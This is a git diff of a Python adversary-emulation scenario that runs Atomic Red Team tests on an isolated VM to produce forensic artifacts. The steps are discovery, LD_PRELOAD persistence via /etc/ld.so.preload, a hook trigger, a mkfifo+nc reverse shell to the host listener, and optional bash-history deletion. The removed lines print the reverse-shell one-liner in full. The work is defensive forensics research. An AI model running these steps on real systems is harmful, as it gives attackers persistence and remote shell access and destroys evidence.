@@ -5,73 +5,78 @@ Scenario 01 -- LD_PRELOAD infection via /etc/ld.so.preload
 
 Attack narrative
 ----------------
-The attacker gains initial SSH access as an unprivileged user. They perform
+The attacker gains initial SSH access as an unprivileged user.  They perform
 system discovery, compile a malicious shared library that hooks getuid(3),
 write it to /etc/ld.so.preload, then trigger the hook by spawning a new
-process. A reverse shell is established from inside that hooked process,
-leaving the .so mapped in memory. Cleanup optionally clears bash history.
+process.  A reverse shell is established from inside that hooked process,
+leaving the .so mapped in memory.  Cleanup optionally clears bash history.
 
 Steps
 -----
-1. T1082  discovery -- system info collection (best-effort)
-2. T1574.006  LD_PRELOAD infection -- compile .so + write /etc/ld.so.preload
-3. custom  ldpreload_trigger -- spawn a new process, verify hook is active
-4. custom  reverse_shell -- mkfifo+nc shell back to host listener
-5. T1070.003  cleanup -- clear bash history (only if run_cleanup=True)
+1. T1082        -- system info collection          (best-effort)
+2. T1574.006    -- compile .so + write /etc/ld.so.preload
+3. custom       -- spawn process, verify hook active in /proc/<pid>/maps
+4. T1059.004    -- mkfifo+nc reverse shell (leaves socket + .so in memory)
+5. cleanup only when run_cleanup=True:
+   - plant bash history so T1070.003 has a file to remove
+   - T1070.003  -- rm ~/.bash_history
+   - T1574.006 ART cleanup -- remove /etc/ld.so.preload + .so
+
+Forensic artifacts
+------------------
+Disk:
+  /etc/ld.so.preload   written by step 2; removed by cleanup
+  /tmp/T1574006.so     compiled .so;      removed by cleanup
+  ~/.bash_history      present if cleanup NOT run; absent if cleanup IS run
+
+Memory:
+  any process spawned after step 2 has /tmp/T1574006.so mapped
+  reverse shell process: open TCP socket + /tmp/T1574006.so in maps
 
 Ground-truth shape
 ------------------
-run() returns {"steps": [...]} (orchestrator stamps "scenario_id" on top).
-Step entries are heterogeneous by design:
-- ART steps (1, 2, 5):  {step, guid, name, exit_code, stdout, stderr}
-- ldpreload_trigger:    {step, exit_code, id_output, hook_active}
-- reverse_shell:        {step, exit_code, connected, id_output, error}
-- cleanup (skipped):    {step, run: False}
-
-Forensic artifacts generated
------------------------------
-Disk:
-  /etc/ld.so.preload          -- written by T1574.006; removed by its cleanup
-  /tmp/T1574006.so            -- compiled malicious shared library
-  /tmp/atomics/T1574.006/     -- source tree uploaded by ArtRunner
-  ~/.bash_history             -- if cleanup NOT run: contains all commands above
-                              -- if cleanup IS run: file absent or truncated
-
-Memory:
-  any process spawned after step 2 has /tmp/T1574006.so mapped in its address space
-  confirmed by constructor banner in stdout of trigger process and reverse shell
-  forensic artifact: /proc/<pid>/maps entry for /tmp/T1574006.so"""
+run() returns {"steps": [...]}.
+The orchestrator stamps "scenario_id" on top.
+"""
 
 from __future__ import annotations
 
-import logging
-import socket
-import threading
-import time
 from typing import Any
 
 from orchestrator.attacks.art_runner import ArtRunner
+from orchestrator.attacks.helpers import (
+    ArtStep,
+    plant_history,
+    run_art_cleanup,
+    run_art_step,
+    run_reverse_shell,
+)
 from orchestrator.core import console
 from orchestrator.core.ssh_client import SSHClient
 
-_log = logging.getLogger(__name__)
+# --- ART step descriptors -----------------------------------------------
 
-# --- ART test identifiers ------------------------------------------------
+_DISCOVERY = ArtStep(
+    name="discovery",
+    technique="T1082",
+    guid="cccb070c-df86-4216-a5bc-9fb60c74e27c",  # List OS Information
+)
 
-_DISCOVERY_T = "T1082"
-_DISCOVERY_G = "cccb070c-df86-4216-a5bc-9fb60c74e27c"  # List OS Information
+_LDPRELOAD = ArtStep(
+    name="ldpreload",
+    technique="T1574.006",
+    guid="39cb0e67-dd0d-4b74-a74b-c072db7ae991",  # /etc/ld.so.preload
+    has_prereq=True,
+)
 
-_LDPRELOAD_T = "T1574.006"
-_LDPRELOAD_G = "39cb0e67-dd0d-4b74-a74b-c072db7ae991"  # /etc/ld.so.preload
-
-_CLEANUP_T = "T1070.003"
-_CLEANUP_G = "a934276e-2be5-4a36-93fd-98adbb5bd4fc"  # rm ~/.bash_history
-
-_REVSHELL_PORT = 4444
-_REVSHELL_TIMEOUT = 10
+_CLEANUP_HISTORY = ArtStep(
+    name="cleanup_history",
+    technique="T1070.003",
+    guid="a934276e-2be5-4a36-93fd-98adbb5bd4fc",  # rm ~/.bash_history
+)
 
 
-# --- public entry point --------------------------------------------------
+# --- public entry point -------------------------------------------------
 
 
 def run(
@@ -83,153 +88,57 @@ def run(
     *,
     run_cleanup: bool = False,
 ) -> dict[str, Any]:
-    """
-    Execute scenario 01 steps in sequence.
+    steps: list[dict[str, Any]] = []
 
-    Returns a ground-truth dict. The orchestrator stamps "scenario_id" on top.
-    Raises RuntimeError if a mandatory step fails.
-    """
-    ground_truth: dict[str, Any] = {"steps": []}
-    steps = ground_truth["steps"]
-
-    # Step 1 -- discovery (best-effort, a failed discovery does not abort the run)
     console.step_header("[1/4] discovery")
-    result = runner.run_test(_DISCOVERY_T, _DISCOVERY_G, raise_on_error=False)
-    steps.append({"step": "discovery", **result})
+    steps.append(run_art_step(runner, _DISCOVERY))
 
-    # Step 2 -- LD_PRELOAD infection
-    # Prereq compiles the .so on the victim (offline-safe: no network call in the
-    # ART source). We bracket with internet_on/off anyway so the convention holds
-    # for future scenarios whose prereqs do fetch assets over the network.
     console.step_header("[2/4] LD_PRELOAD infection")
-    internet_on()
-    try:
-        runner.run_prerequisites(_LDPRELOAD_T, _LDPRELOAD_G, timeout=60)
-    finally:
-        internet_off()
-    result = runner.run_test(_LDPRELOAD_T, _LDPRELOAD_G)
-    steps.append({"step": "ldpreload", **result})
+    steps.append(
+        run_art_step(
+            runner,
+            _LDPRELOAD,
+            internet_on=internet_on,
+            internet_off=internet_off,
+            raise_on_error=True,
+        )
+    )
 
-    # Step 3 -- trigger the hook
-    # Spawn a new shell process so the dynamic linker loads /etc/ld.so.preload.
-    # The .so hooks getuid(3) to return 0; we capture `id` output as evidence.
-    # Even if the hook does not work (e.g. libc version mismatch), the process
-    # still has /tmp/T1574006.so mapped in memory -- a recoverable artifact.
     console.step_header("[3/4] LD_PRELOAD hook trigger")
-    result = _trigger_hook(ssh)
-    steps.append({"step": "ldpreload_trigger", **result})
+    steps.append(_trigger_hook(ssh))
 
-    # Step 4 -- reverse shell
-    # The shell spawned here inherits the hooked environment; its process maps
-    # will show /tmp/T1574006.so loaded.
     console.step_header("[4/4] reverse shell")
-    result = _run_reverse_shell(ssh, host_ip)
-    steps.append({"step": "reverse_shell", **result})
+    run_reverse_shell(ssh, host_ip, steps)
 
-    # Cleanup (optional -- leave False to preserve all artifacts for forensics)
     if run_cleanup:
         console.step_header("cleanup")
-        runner.run_test(_CLEANUP_T, _CLEANUP_G, raise_on_error=False)
-        runner.run_cleanup(_LDPRELOAD_T, _LDPRELOAD_G)
-        steps.append({"step": "cleanup", "run": True})
+        plant_history(ssh, steps)
+        steps.append(run_art_step(runner, _CLEANUP_HISTORY))
+        run_art_cleanup(runner, _LDPRELOAD, steps)
     else:
         console.step_header("cleanup (skipped: artifacts preserved)")
         steps.append({"step": "cleanup", "run": False})
 
-    return ground_truth
+    return {"steps": steps}
 
 
-# --- custom step helpers -------------------------------------------------
+# --- scenario-local helpers ---------------------------------------------
 
 
 def _trigger_hook(ssh: SSHClient) -> dict[str, Any]:
-    code, out, err = ssh.run("sh -c 'id'", timeout=10)
-    # The .so has only a constructor that prints a banner (no symbol hooks).
-    # Presence of this string confirms the dynamic linker loaded the library.
+    code, out, _ = ssh.run("sh -c 'id'", timeout=10)
+    # Constructor banner confirms the dynamic linker loaded the library.
     loaded = "Loaded Atomic Red Team Library" in out
     if loaded:
         console.ok("LD_PRELOAD .so confirmed loaded (constructor ran)", indent=True)
     else:
         console.warn(
-            f"LD_PRELOAD .so constructor not observed: {out.strip()!r}", indent=True,
+            f"LD_PRELOAD .so constructor not observed: {out.strip()!r}", indent=True
         )
     return {
+        "step": "ldpreload_trigger",
+        "technique": "T1574.006",
         "exit_code": code,
         "id_output": out.strip(),
         "so_loaded": loaded,
-    }
-
-
-def _run_reverse_shell(ssh: SSHClient, host_ip: str) -> dict[str, Any]:
-    """
-    Bind a TCP listener on the host, trigger a mkfifo+nc reverse shell on the
-    VM, send one command to confirm the connection, then close it.
-
-    We only need to confirm that the shell connected and leave a process + open
-    socket in memory for forensics. The shell is killed immediately after.
-
-    host_ip: the isolated-network gateway address as seen from the VM
-             (config.ISOLATED_NETWORK_GATEWAY).
-    """
-    received: list[str] = []
-    error: list[str] = []
-
-    def _listen() -> None:
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
-                srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-                srv.bind(("0.0.0.0", _REVSHELL_PORT))
-                srv.listen(1)
-                srv.settimeout(_REVSHELL_TIMEOUT)
-                conn, addr = srv.accept()
-                console.ok(f"reverse shell connected from {addr}", indent=True)
-                conn.sendall(b"id\n")
-                conn.sendall(b"id\n")
-                time.sleep(0.8)  # slightly longer to let sh flush its startup noise
-                data = conn.recv(4096).decode(errors="replace")
-                # Strip /bin/sh startup noise and the prompt characters before recording
-                clean_lines = [
-                    ln
-                    for ln in data.splitlines()
-                    if ln.strip()
-                    and not ln.startswith("/bin/sh:")
-                    and not ln.strip().startswith("$")
-                    and not ln.strip().startswith("#")
-                ]
-                received.append("\n".join(clean_lines).strip())
-                conn.sendall(b"exit\n")
-                conn.close()
-        except Exception as exc:
-            error.append(str(exc))
-
-    # Listener must be bound before the VM-side nc is triggered; otherwise the
-    # VM connects to a closed port and the shell dies before we read anything.
-    listener = threading.Thread(target=_listen, daemon=True)
-    listener.start()
-    time.sleep(0.3)
-
-    fifo = "/tmp/.rs_fifo"
-    cmd = (
-        f"rm -f {fifo}; mkfifo {fifo}; "
-        f"cat {fifo} | /bin/sh -i 2>&1 | nc {host_ip} {_REVSHELL_PORT} > {fifo} &"
-    )
-    code, out, err = ssh.run(cmd, timeout=15)
-
-    listener.join(timeout=_REVSHELL_TIMEOUT + 2)
-
-    if error:
-        console.warn(f"reverse shell listener error: {error[0]}", indent=True)
-    elif not received:
-        console.warn(
-            "reverse shell: no data received (connection may have failed)",
-            indent=True,
-        )
-    else:
-        console.ok(f"id output: {received[0]}", indent=True)
-
-    return {
-        "exit_code": code,
-        "connected": bool(received),
-        "id_output": received[0] if received else "",
-        "error": error[0] if error else "",
     }
